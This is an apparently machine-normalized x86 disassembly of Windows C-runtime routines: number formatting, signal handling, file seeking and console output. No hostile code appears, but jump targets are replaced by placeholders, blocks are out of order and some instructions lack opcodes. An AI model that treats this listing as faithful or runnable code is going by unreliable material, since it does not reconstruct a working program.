call sub_4110bb
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_411077
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
cmp [ ebp + 0x10 ] eax
mov [ esi ] 0x0
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_411077
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_413fad
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_41a0a8
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
cmp [ ebp + 0x14 ] edx
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_41ac30
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41d0b0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41d0b0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_4109d0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_41d0b0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_41cfd0
add al 0x30
mov [ esi ] al
inc esi
cmp esi edi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_41cfd0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_41cfd0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41a437
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_4110bb
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_419e34
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_419e34
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_419e34
push edi
push 0x30
push esi
call sub_4109d0
add esp 0xc
sub_41a52c
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41cf3a
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_41a437
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_41cdc2
add esp 0x10
cmp eax ebx
je r-xdata
sub_41a5e5
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41cf3a
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_413fad
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
cmp ecx 0xffffffff
lea edi [ eax + esi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_41cdc2
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_419e6d
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41a437
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_41a6dd
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419fda
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a52c
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a0c6
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a5e5
jmp r-xdata
sub_41a763
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a6dd
add esp 0x1c
pop ebp
retn
sub_41a784
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_4154f5
add edi 0x4
cmp edi 0x28
pop ecx
mov [ esi ] eax
jb r-xdata
pop edi
pop esi
retn
sub_41a7a3
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_41d0d8
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
sub_41a7cc
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_41a808
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_41a7cc
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_41a831
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_41a97b
test eax eax
je r-xdata
push 0xa
call sub_414d58
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_41a988
pop ecx
push 0x3
call sub_4131fa
int3
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_4109d0
lea eax [ ebp - 0x80 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push 0x0
mov [ ebp - 0x80 ] 0x40000015
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_41a947
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ esp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ esp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
retn
sub_41a988
push 0x20
push r--data
call sub_4106dc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_4156e8
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_410721
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_41a947
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_4131fa
mov [ ebp - 0x1c ] 0x1
push eax
call sub_415561
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_411077
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413fad
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4141fc
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_415558
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41aafc
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_41ab5c
push 0x14
push r--data
call sub_4106dc
xor edi edi
mov [ ebp - 0x1c ] edi
push [ rw-data ]
call sub_415561
pop ecx
mov esi eax
cmp esi edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x20 ] eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_413016
pop ecx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_410721
retn
cmp [ ebp - 0x1c ] 0x1
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413eb1
add esp 0x14
mov esi sub_41ab4c
push r--data
call [ GetModuleHandleA@IAT ]
cmp eax edi
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call sub_4154f5
pop ecx
mov [ rw-data ] eax
sub_41ac30
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_41ac65
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_41d1c3
or edi 0xffffffff
cmp eax edi
pop ecx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
cmp eax edi
mov [ ebp - 0x8 ] eax
jne r-xdata
call sub_411077
mov [ eax ] 0x9
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_41109d
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_41ace8
push 0x14
push r--data
call sub_4106dc
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41108a
and [ eax ] 0x0
call sub_411077
mov [ eax ] 0x9
call sub_41108a
mov [ eax ] edi
call sub_411077
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_410721
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_41d234
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_41108a
mov [ eax ] edi
call sub_411077
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_411077
mov [ eax ] 0x9
call sub_41108a
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ac65
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41adf7
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_41ae01
push ebp
lea ebp [ esp - 0x518 ]
sub esp 0x594
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x514 ] eax
mov eax [ ebp + 0x524 ]
push esi
xor esi esi
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x68 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x520 ]
push ebx
mov ebx esi
and ebx 0x1f
imul ebx ebx 0x28
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
cmp cl 0x2
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x55 ] cl
je r-xdata
call sub_41108a
mov [ eax ] esi
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x514 ]
xor ecx ebp
pop esi
call sub_40f589
add ebp 0x518
leave
retn
mov ecx [ ebp + 0x528 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_41108a
xor esi esi
mov [ eax ] esi
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
jmp r-xdata
push esi
call sub_41b4e7
test eax eax
pop ecx
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_41ac65
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ edi ]
add eax ebx
test [ eax + 0x4 ] 0x80
je r-xdata
mov eax [ edi ]
test [ ebx + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x6c ]
push ecx
push [ ebp + 0x528 ]
push [ ebp - 0x64 ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
xor esi esi
cmp [ ebp - 0x55 ] 0x0
mov [ ebp - 0x54 ] esi
jne r-xdata
call sub_41576b
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x7c ]
sete cl
push eax
mov eax [ edi ]
push [ ebx + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x6c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x60 ] eax
jmp r-xdata
cmp [ ebp - 0x55 ] 0x2
jne r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x50 ] eax
jbe r-xdata
test esi esi
je r-xdata
sub eax [ ebp - 0x68 ]
mov edi [ ebp - 0x70 ]
mov eax [ ebp - 0x60 ]
test eax eax
jne r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x5c ] eax
jbe r-xdata
cmp [ ebp + 0x528 ] esi
mov [ ebp - 0x50 ] eax
jbe r-xdata
mov eax [ edi ]
test [ ebx + eax + 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x50 ]
and [ ebp - 0x5c ] 0x0
sub ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x4c ]
call [ GetConsoleCP@IAT ]
and [ ebp - 0x50 ] 0x0
cmp [ ebp + 0x528 ] 0x0
mov esi [ ebp - 0x64 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x74 ] esi
jbe r-xdata
cmp [ ebp - 0x55 ] 0x0
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x54 ] esi
jne r-xdata
mov ecx [ ebp - 0x5c ]
and [ ebp - 0x50 ] 0x0
sub ecx [ ebp - 0x64 ]
push 0x2
lea eax [ ebp + 0x3b8 ]
pop esi
mov ecx [ ebp - 0x50 ]
xor esi esi
sub ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x4c ]
call sub_411077
mov [ eax ] 0x1c
mov eax [ ebp - 0x64 ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x4c ]
sub esi eax
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
xor esi esi
cmp [ ebp - 0x54 ] esi
je r-xdata
and [ ebp - 0x5c ] 0x0
jmp r-xdata
push [ ebp - 0x54 ]
call sub_41109d
pop ecx
jmp r-xdata
call sub_411077
mov [ eax ] 0x9
jmp r-xdata
xor esi esi
push esi
push esi
push 0x2ab
lea ecx [ ebp + 0x108 ]
push ecx
lea ecx [ ebp + 0x3b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp edi esi
je r-xdata
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
add [ ebp - 0x5c ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x4c ]
sub esi eax
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x50 ]
add [ ebp - 0x50 ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x5c ]
cmp [ ebp - 0x5c ] 0x400
jb r-xdata
inc [ ebp - 0x68 ]
mov [ eax ] 0xd
